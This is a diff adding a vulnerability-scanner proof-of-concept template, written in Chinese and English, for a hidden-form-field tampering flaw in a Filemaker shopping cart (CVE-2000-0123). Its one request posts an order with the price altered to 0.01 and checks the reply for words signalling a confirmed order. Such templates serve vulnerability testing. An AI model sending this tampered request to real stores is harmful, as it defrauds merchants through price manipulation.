@@ -1,0 +1,36 @@
+[info]
+author = "ave"
+description = "Filemaker 购物车应用未对隐藏表单字段进行服务端校验，远程攻击者通过拦截并修改商品价格、数量等隐藏字段，可以非正常价格完成购买。发送包含篡改后隐藏字段的 POST 请求，验证服务器是否接受篡改数据。"
+id = "POC-AVE-2000-0112"
+name = "Filemaker 购物车隐藏表单字段篡改 PoC"
+severity = "high"
+tags = ["ave-2000-0112"]
+vuln_id = [
+    "CVE-2000-0123",
+    "AVE-2000-0112",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/shoppingcart/order"
+protocol = "http"
+
+[poc.requests.body]
+content = "item_id=1&quantity=1&price=0.01"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "order",
+    "success",
+    "confirmed",
+]
